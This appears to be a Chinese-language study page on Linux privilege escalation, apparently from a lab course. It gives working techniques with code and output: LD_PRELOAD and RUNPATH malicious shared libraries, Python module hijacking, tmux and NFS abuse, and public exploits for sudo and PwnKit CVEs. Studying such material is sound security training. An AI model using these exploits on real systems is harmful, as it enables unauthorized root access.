<td>如果使用 root 用户访问 NFS 共享，则会将其更改为<code>nfsnobody</code>用户，这是一个非特权帐户。由 root 用户创建和上传的任何文件都将归该用户所有<code>nfsnobody</code>，这可以防止攻击者上传设置了 SUID 位的二进制文件。</td>
</tr>
<tr>
<td><code>no_root_squash</code></td>
<td>以本地 root 用户身份连接到共享的远程用户将能够以 root 用户身份在 NFS 服务器上创建文件。这将允许创建设置了 SUID 位的恶意脚本&#x2F;程序。</td>
</tr>
</tbody></table>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">$ cat /etc/exports</span><br><span class="line"></span><br><span class="line"># /etc/exports: the access control list for filesystems which may be exported</span><br><span class="line">#		to NFS clients.  See exports(5).</span><br><span class="line">#</span><br><span class="line"># Example for NFSv2 and NFSv3:</span><br><span class="line"># /srv/homes       hostname1(rw,sync,no_subtree_check) hostname2(ro,sync,no_subtree_check)</span><br><span class="line">#</span><br><span class="line"># Example for NFSv4:</span><br><span class="line"># /srv/nfs4        gss/krb5i(rw,sync,fsid=0,crossmnt,no_subtree_check)</span><br><span class="line"># /srv/nfs4/homes  gss/krb5i(rw,sync,no_subtree_check)</span><br><span class="line">#</span><br><span class="line">/var/nfs/general *(rw,no_root_squash)</span><br><span class="line">/tmp *(rw,no_root_squash)</span><br></pre></td></tr></table></figure>

<p>可以创建一个使用本地 root 用户执行<code>/bin/sh</code>的 SETUID 二进制文件。然后，在本地挂载目录，将 root 拥有的二进制文件复制到 NFS 服务器，并设置 SUID 位。</p>
<h2 id="Hijacking-Tmux-Session"><a href="#Hijacking-Tmux-Session" class="headerlink" title="Hijacking Tmux Session"></a>Hijacking Tmux Session</h2><p>用户可能会让<code>tmux</code>进程以特权用户身份运行，例如设置了弱权限的 root，并且可能被劫持。</p>
<p>创建新的共享会话并修改所有权</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ tmux -S /shareds new -s debugsess</span><br><span class="line">$ chown root:devs /shareds</span><br></pre></td></tr></table></figure>

<p>如果可以攻陷<code>dev</code>组中的一个用户，就可以附加到该会话并获得 root 访问权限。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ tmux -S /shareds</span><br><span class="line"></span><br><span class="line">id</span><br><span class="line"></span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br></pre></td></tr></table></figure>

<h1 id="Kernel-Exploits"><a href="#Kernel-Exploits" class="headerlink" title="Kernel Exploits"></a>Kernel Exploits</h1><p>各种 Linux 内核版本都存在内核级漏洞。这些漏洞利用内核中的漏洞以 root 权限执行代码。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$ uname -a</span><br><span class="line"></span><br><span class="line">Linux NIX02 4.4.0-116-generic #140-Ubuntu SMP Mon Feb 12 21:23:04 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux</span><br><span class="line"></span><br><span class="line">$ cat /etc/lsb-release </span><br><span class="line"></span><br><span class="line">DISTRIB_ID=Ubuntu</span><br><span class="line">DISTRIB_RELEASE=16.04</span><br><span class="line">DISTRIB_CODENAME=xenial</span><br><span class="line">DISTRIB_DESCRIPTION=&quot;Ubuntu 16.04.4 LTS&quot;</span><br></pre></td></tr></table></figure>

<h1 id="Shared-Libraries"><a href="#Shared-Libraries" class="headerlink" title="Shared Libraries"></a>Shared Libraries</h1><p>Linux 程序通常使用动态链接共享对象库。库包含已编译的代码或其他数据，开发人员可以使用它们来避免在多个程序中重写相同的代码。Linux 中存在两种类型的库：<code>static libraries</code>（用 .a 文件扩展名表示）和<code>dynamically linked shared object libraries</code>（用 .so 文件扩展名表示）。编译程序时，静态库将成为程序的一部分，无法更改。但是，可以修改动态库以控制调用它们的程序的执行。</p>
<p><code>LD_PRELOAD</code>环境变量可以在执行二进制文件之前加载库。此库中的函数优先于默认函数。</p>
<p>使用<code>ldd</code>实用程序查看二进制文件所需的共享对象</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ ldd /bin/ls</span><br><span class="line"></span><br><span class="line">	linux-vdso.so.1 =&gt;  (0x00007fff03bc7000)</span><br><span class="line">	libselinux.so.1 =&gt; /lib/x86_64-linux-gnu/libselinux.so.1 (0x00007f4186288000)</span><br><span class="line">	libc.so.6 =&gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007f4185ebe000)</span><br><span class="line">	libpcre.so.3 =&gt; /lib/x86_64-linux-gnu/libpcre.so.3 (0x00007f4185c4e000)</span><br><span class="line">	libdl.so.2 =&gt; /lib/x86_64-linux-gnu/libdl.so.2 (0x00007f4185a4a000)</span><br><span class="line">	/lib64/ld-linux-x86-64.so.2 (0x00007f41864aa000)</span><br><span class="line">	libpthread.so.0 =&gt; /lib/x86_64-linux-gnu/libpthread.so.0 (0x00007f418582d000)</span><br></pre></td></tr></table></figure>

<p>exploit</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ sudo -l</span><br><span class="line"></span><br><span class="line">Matching Defaults entries for daniel.carter on NIX02:</span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, env_keep+=LD_PRELOAD</span><br><span class="line"></span><br><span class="line">User daniel.carter may run the following commands on NIX02:</span><br><span class="line">    (root) NOPASSWD: /usr/sbin/apache2 restart</span><br></pre></td></tr></table></figure>

<p>利用此<code>LD_PRELOAD</code>问题来运行自定义共享库文件</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> _init() &#123;</span><br><span class="line">unsetenv(<span class="string">&quot;LD_PRELOAD&quot;</span>);</span><br><span class="line">setgid(<span class="number">0</span>);</span><br><span class="line">setuid(<span class="number">0</span>);</span><br><span class="line">system(<span class="string">&quot;/bin/bash&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>编译</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -fPIC -shared -o root.so root.c -nostartfiles</span><br></pre></td></tr></table></figure>

<p>指定恶意库文件的完整路径</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ sudo LD_PRELOAD=/tmp/root.so /usr/sbin/apache2 restart</span><br><span class="line"></span><br><span class="line">id</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br></pre></td></tr></table></figure>

<h1 id="Shared-Object-Hijacking"><a href="#Shared-Object-Hijacking" class="headerlink" title="Shared Object Hijacking"></a>Shared Object Hijacking</h1><p>正在开发的程序和二进制文件通常具有与之关联的自定义库。</p>
<p><code>ldd</code> 显示对象的位置以及针对程序的每个依赖项将其加载到内存中的十六进制地址</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ ldd payroll</span><br><span class="line"></span><br><span class="line">linux-vdso.so.1 =&gt;  (0x00007ffcb3133000)</span><br><span class="line">libshared.so =&gt; /lib/x86_64-linux-gnu/libshared.so (0x00007f7f62e51000)</span><br><span class="line">libc.so.6 =&gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007f7f62876000)</span><br><span class="line">/lib64/ld-linux-x86-64.so.2 (0x00007f7f62c40000)</span><br></pre></td></tr></table></figure>

<p>看到一个名为<code>libshared.so</code>的非标准库被列为二进制文件的依赖项。如前所述，可以从自定义位置加载共享库。配置就是这样一种设置<code>RUNPATH</code>。此文件夹中的库优先于其他文件夹。可以使用<a target="_blank" rel="noopener" href="https://man7.org/linux/man-pages/man1/readelf.1.html">readelf</a>实用程序检查这一点。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ readelf -d payroll  | grep PATH</span><br><span class="line"></span><br><span class="line"> 0x000000000000001d (RUNPATH)            Library runpath: [/development]</span><br></pre></td></tr></table></figure>

<p>该配置允许从<code>/development</code>文件夹加载库，所有用户均可写入。可以通过将恶意库放置在<code>/development</code>中来利用此错误配置，该库将优先于其他文件夹，因为此文件中的条目会首先被检查（在配置文件中存在的其他文件夹之前）。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ ls -la /development/</span><br><span class="line"></span><br><span class="line">total 8</span><br><span class="line">drwxrwxrwx  2 root root 4096 Sep  1 22:06 ./</span><br><span class="line">drwxr-xr-x 23 root root 4096 Sep  1 21:26 ../</span><br></pre></td></tr></table></figure>

<p>在编译库之前，需要找到二进制文件调用的函数名。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$ ldd payroll</span><br><span class="line"></span><br><span class="line">linux-vdso.so.1 (0x00007ffd22bbc000)</span><br><span class="line">libshared.so =&gt; /development/libshared.so (0x00007f0c13112000)</span><br><span class="line">/lib64/ld-linux-x86-64.so.2 (0x00007f0c1330a000)</span><br><span class="line"></span><br><span class="line">$ cp /lib/x86_64-linux-gnu/libc.so.6 /development/libshared.so</span><br><span class="line"></span><br><span class="line">$ ./payroll </span><br><span class="line"></span><br><span class="line">./payroll: symbol lookup error: ./payroll: undefined symbol: dbquery</span><br></pre></td></tr></table></figure>

<p>运行<code>ldd</code>二进制文件会列出库的路径<code>/development/libshared</code>，这意味着它存在漏洞。执行二进制文件会抛出一个错误，指出找不到名为的函数<code>dbquery</code>。可以编译一个包含此函数的共享对象。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">dbquery</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Malicious library loaded\n&quot;</span>);</span><br><span class="line">    setuid(<span class="number">0</span>);</span><br><span class="line">    system(<span class="string">&quot;/bin/sh -p&quot;</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<p>编译</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc src.c -fPIC -shared -o /development/libshared.so</span><br></pre></td></tr></table></figure>

<p>exploit</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ ./payroll </span><br><span class="line"></span><br><span class="line">***************Inlane Freight Employee Database***************</span><br><span class="line"></span><br><span class="line">Malicious library loaded</span><br><span class="line"># id</span><br><span class="line">uid=0(root) gid=1000(mrb3n) groups=1000(mrb3n)</span><br></pre></td></tr></table></figure>

<h1 id="Python-Library-Hijacking"><a href="#Python-Library-Hijacking" class="headerlink" title="Python Library Hijacking"></a>Python Library Hijacking</h1><h2 id="错误的写入权限"><a href="#错误的写入权限" class="headerlink" title="错误的写入权限"></a>错误的写入权限</h2><p>查看<code>mem_status.py</code>脚本的设置权限，可以看到它有一个<code>SUID</code>设置</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ ls -l mem_status.py</span><br><span class="line"></span><br><span class="line">-rwsrwxr-x 1 root mrb3n 188 Dec 13 20:13 mem_status.py</span><br></pre></td></tr></table></figure>

<p>查看脚本</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python3</span><br><span class="line">import psutil</span><br><span class="line"></span><br><span class="line">available_memory = psutil.virtual_memory().available * 100 / psutil.virtual_memory().total</span><br><span class="line"></span><br><span class="line">print(f&quot;Available memory: &#123;round(available_memory, 2)&#125;%&quot;)</span><br></pre></td></tr></table></figure>

<p>第二行看到这个脚本导入了模块<code>psutil</code>并使用了函数<code>virtual_memory()</code>。因此，可以在文件夹中查找此功能<code>psutil</code>并检查该模块是否具有写入权限。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">$ grep -r &quot;def virtual_memory&quot; /usr/local/lib/python3.8/dist-packages/psutil/*</span><br><span class="line"></span><br><span class="line">/usr/local/lib/python3.8/dist-packages/psutil/__init__.py:def virtual_memory():</span><br><span class="line">/usr/local/lib/python3.8/dist-packages/psutil/_psaix.py:def virtual_memory():</span><br><span class="line">/usr/local/lib/python3.8/dist-packages/psutil/_psbsd.py:def virtual_memory():</span><br><span class="line">/usr/local/lib/python3.8/dist-packages/psutil/_pslinux.py:def virtual_memory():</span><br><span class="line">/usr/local/lib/python3.8/dist-packages/psutil/_psosx.py:def virtual_memory():</span><br><span class="line">/usr/local/lib/python3.8/dist-packages/psutil/_pssunos.py:def virtual_memory():</span><br><span class="line">/usr/local/lib/python3.8/dist-packages/psutil/_pswindows.py:def virtual_memory():</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">htb-student@lpenix:~$ ls -l /usr/local/lib/python3.8/dist-packages/psutil/__init__.py</span><br><span class="line"></span><br><span class="line">-rw-r--rw- 1 root staff 87339 Dec 13 20:07 /usr/local/lib/python3.8/dist-packages/psutil/__init__.py</span><br></pre></td></tr></table></figure>

<p>注入代码</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">...SNIP...</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">virtual_memory</span>():</span><br><span class="line"></span><br><span class="line">	...SNIP...</span><br><span class="line">	<span class="comment">#### Hijacking</span></span><br><span class="line">	<span class="keyword">import</span> os</span><br><span class="line">	os.system(<span class="string">&#x27;id&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">...SNIP...</span><br></pre></td></tr></table></figure>

<p>exploit</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ sudo python3 ./mem_status.py</span><br><span class="line"></span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br><span class="line">Available memory: 79.22%</span><br></pre></td></tr></table></figure>

<h2 id="Library-Path"><a href="#Library-Path" class="headerlink" title="Library Path"></a>Library Path</h2><p>在 Python 中，每个版本都有指定的搜索和导入库 (<code>modules</code>) 的顺序。Python 导入<code>modules</code>的顺序基于优先级系统，这意味着列表中较高的路径优先于列表中较低的路径。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ python3 -c &#x27;import sys; print(&quot;\n&quot;.join(sys.path))&#x27;</span><br><span class="line"></span><br><span class="line">/usr/lib/python38.zip</span><br><span class="line">/usr/lib/python3.8</span><br><span class="line">/usr/lib/python3.8/lib-dynload</span><br><span class="line">/usr/local/lib/python3.8/dist-packages</span><br><span class="line">/usr/lib/python3/dist-packages</span><br></pre></td></tr></table></figure>

<p>为了能够使用此改变，需要满足两个先决条件：</p>
<ol>
<li>脚本导入的模块位于通过 <code>PYTHONPATH</code> 变量列出的较低优先级路径之一下。</li>
<li>必须对列表中具有较高优先级的路径之一具有写权限。</li>
</ol>
<p>如果导入的模块位于列表中较低的路径中，并且用户可以编辑更高优先级的路径，可以自己创建一个具有相同名称的模块并包含自己想要的功能。由于更高优先级的路径会更早被读取并检查相关模块，因此 Python 会访问它找到的第一个匹配项并将其导入，然后再到达原始和预期的模块。</p>
<p>查看安装位置</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ pip3 show psutil</span><br><span class="line"></span><br><span class="line">...SNIP...</span><br><span class="line">Location: /usr/local/lib/python3.8/dist-packages</span><br><span class="line"></span><br><span class="line">...SNIP...</span><br></pre></td></tr></table></figure>

<p>查看环境中是否存在任何错误配置，以允许<code>write</code>访问其中任何一个</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ ls -la /usr/lib/python3.8</span><br><span class="line"></span><br><span class="line">total 4916</span><br><span class="line">drwxr-xrwx 30 root root 20480 Dec 14 16:26 .</span><br><span class="line">...SNIP...</span><br></pre></td></tr></table></figure>

<p>路径配置错误，允许任何用户对其进行写入。通过与 PYTHONPATH 变量的值进行交叉检查，可以看到此路径在列表中的位置高于安装 psutil 的路径。尝试利用此错误配置在 &#x2F;usr&#x2F;lib&#x2F;python3.8 目录中创建自己的 psutil 模块，其中包含自己的恶意 virtual_memory() 函数。</p>
<p>为了达到这一点，需要在前面提到的目录中创建与导入具有相同的名称一个名为的文件（<code>psutil.py</code>），其中包含下面列出的内容。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">virtual_memory</span>():</span><br><span class="line">    os.system(<span class="string">&#x27;id&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>exploit</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ sudo python3 mem_status.py</span><br><span class="line"></span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File &quot;mem_status.py&quot;, line 4, in &lt;module&gt;</span><br><span class="line">    available_memory = psutil.virtual_memory().available * 100 / psutil.virtual_memory().total</span><br><span class="line">AttributeError: &#x27;NoneType&#x27; object has no attribute &#x27;available&#x27; </span><br></pre></td></tr></table></figure>

<h1 id="Vulnerabilities"><a href="#Vulnerabilities" class="headerlink" title="Vulnerabilities"></a>Vulnerabilities</h1><h2 id="Sudo"><a href="#Sudo" class="headerlink" title="Sudo"></a>Sudo</h2><h3 id="CVE-2021-3156"><a href="#CVE-2021-3156" class="headerlink" title="CVE-2021-3156"></a>CVE-2021-3156</h3><p>CVE-2021-3156 并且基于基于堆的缓冲区溢出漏洞。这影响了 sudo 版本：</p>
<ul>
<li>1.8.31——Ubuntu 20.04</li>
<li>1.8.27 - Debian 10</li>
<li>1.9.2 - Fedora 33</li>
<li>others</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$ sudo -V</span><br><span class="line"></span><br><span class="line">Sudo version 1.8.31</span><br><span class="line">...SNIP...</span><br><span class="line"></span><br><span class="line">$ cat /etc/lsb-release</span><br><span class="line"></span><br><span class="line">DISTRIB_ID=Ubuntu</span><br><span class="line">DISTRIB_RELEASE=20.04</span><br><span class="line">DISTRIB_CODENAME=focal</span><br><span class="line">DISTRIB_DESCRIPTION=&quot;Ubuntu 20.04.1 LTS&quot;</span><br></pre></td></tr></table></figure>

<p>exploit</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">$ git clone https://github.com/blasty/CVE-2021-3156.git</span><br><span class="line">$ cd CVE-2021-3156</span><br><span class="line">$ make</span><br><span class="line">$ ./sudo-hax-me-a-sandwich</span><br><span class="line"></span><br><span class="line">** CVE-2021-3156 PoC by blasty &lt;peter@haxx.in&gt;</span><br><span class="line"></span><br><span class="line">  usage: ./sudo-hax-me-a-sandwich &lt;target&gt;</span><br><span class="line"></span><br><span class="line">  available targets:</span><br><span class="line">  ------------------------------------------------------------</span><br><span class="line">    0) Ubuntu 18.04.5 (Bionic Beaver) - sudo 1.8.21, libc-2.27</span><br><span class="line">    1) Ubuntu 20.04.1 (Focal Fossa) - sudo 1.8.31, libc-2.31</span><br><span class="line">    2) Debian 10.0 (Buster) - sudo 1.8.27, libc-2.28</span><br><span class="line">  ------------------------------------------------------------</span><br><span class="line"></span><br><span class="line">  manual mode:</span><br><span class="line">    ./sudo-hax-me-a-sandwich &lt;smash_len_a&gt; &lt;smash_len_b&gt; &lt;null_stomp_len&gt; &lt;lc_all_len&gt;</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">$ ./sudo-hax-me-a-sandwich 1</span><br><span class="line"></span><br><span class="line">** CVE-2021-3156 PoC by blasty &lt;peter@haxx.in&gt;</span><br><span class="line"></span><br><span class="line">using target: Ubuntu 20.04.1 (Focal Fossa) - sudo 1.8.31, libc-2.31 [&#x27;/usr/bin/sudoedit&#x27;] (56, 54, 63, 212)</span><br><span class="line">** pray for your rootshell.. **</span><br><span class="line"></span><br><span class="line"># id</span><br><span class="line"></span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br></pre></td></tr></table></figure>

<h3 id="Sudo-Policy-Bypass"><a href="#Sudo-Policy-Bypass" class="headerlink" title="Sudo Policy Bypass"></a>Sudo Policy Bypass</h3><p><a target="_blank" rel="noopener" href="https://www.sudo.ws/security/advisories/minus_1_uid/">CVE-2019-14287</a>，影响了<code>1.8.28</code>以下所有版本，即使使用简单的命令也可以提升权限，只需要一个先决条件。它必须允许<code>/etc/sudoers</code>文件中的用户执行特定命令。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ sudo -l</span><br><span class="line">[sudo] password for cry0l1t3: **********</span><br><span class="line"></span><br><span class="line">User cry0l1t3 may run the following commands on Penny:</span><br><span class="line">    ALL=(ALL) /usr/bin/id</span><br></pre></td></tr></table></figure>

<p>如果在 sudo 中输入负 ID (-1)，则将处理只有 root 才拥有的 ID 0。因此，这会导致直接进入 root shell。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ sudo -u#-1 id</span><br><span class="line"></span><br><span class="line">root@nix02:～# id</span><br><span class="line"></span><br><span class="line">uid=0(root) gid=1005(cry0l1t3) groups=1005(cry0l1t3)</span><br></pre></td></tr></table></figure>

<h2 id="Polkit"><a href="#Polkit" class="headerlink" title="Polkit"></a>Polkit</h2><p>PolicyKit ( <code>polkit</code>) 是基于 Linux 的操作系统上的授权服务，允许用户软件和系统组件在用户软件获得授权的情况下相互通信。</p>
<p>PolKit 附带三个附加程序：</p>
<ul>
<li><code>pkexec</code>- 使用其他用户的权限或 root 权限运行程序</li>
<li><code>pkaction</code>- 可用于显示动作</li>
<li><code>pkcheck</code>- 这可用于检查某个进程是否被授权执行特定操作</li>
</ul>
<p><a target="_blank" rel="noopener" href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-4034">CVE-2021-4034 </a>内存损坏漏洞，也称为<a target="_blank" rel="noopener" href="https://blog.qualys.com/vulnerabilities-threat-research/2022/01/25/pwnkit-local-privilege-escalation-vulnerability-discovered-in-polkits-pkexec-cve-2021-4034">Pwnkit</a>，同样会导致权限提升。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ pkexec -u root id</span><br><span class="line"></span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br></pre></td></tr></table></figure>

<p>exploit</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ git clone https://github.com/arthepsy/CVE-2021-4034.git</span><br><span class="line">$ cd CVE-2021-4034</span><br><span class="line">$ gcc cve-2021-4034-poc.c -o poc</span><br><span class="line">$ ./poc</span><br><span class="line"></span><br><span class="line"># id</span><br><span class="line"></span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br></pre></td></tr></table></figure>

